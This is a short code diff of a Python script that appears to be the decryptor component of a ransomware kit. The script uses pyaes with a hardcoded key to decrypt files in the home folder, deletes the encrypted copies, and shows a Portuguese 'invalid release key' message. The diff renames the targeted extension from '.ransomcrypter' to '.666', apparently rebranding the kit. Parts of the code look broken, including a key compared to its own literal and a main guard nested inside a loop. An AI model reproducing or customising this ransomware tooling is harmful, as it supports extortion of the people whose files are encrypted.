@@ -5,7 +5,7 @@ import pyaes
 from sys import argv
 from pathlib import Path
 key = "102efd86a2bec382e7945002e53505a7"
-filename_filter = ["*.ransomcrypter"]
+filename_filter = ["*.666"]
 base_path=Path.home()
 def revert(var):
     c=int(len(var)-1)
@@ -40,7 +40,7 @@ for o in os.listdir(Path.home()):
     lst_past.append(o)
 def descrypt(decrypt_file):
     try:
-        for file in glob.glob('*.ransomcrypter'):
+        for file in glob.glob('*.666'):
             keybytes = decrypt_file.encode()
             name_file = open(file, 'rb')
             file_data = name_file.read()
@@ -66,7 +66,7 @@ for i in lst_past:
     if __name__ == '__main__':
         if key == '102efd86a2bec382e7945002e53505a7':
             descrypt(key)
-            for del_file in glob.glob('*.ransomcrypter'):
+            for del_file in glob.glob('*.666'):
                 os.remove(f'{desktop}\\{del_file}')
         else:
             print('Chave de liberação inválida!!!')
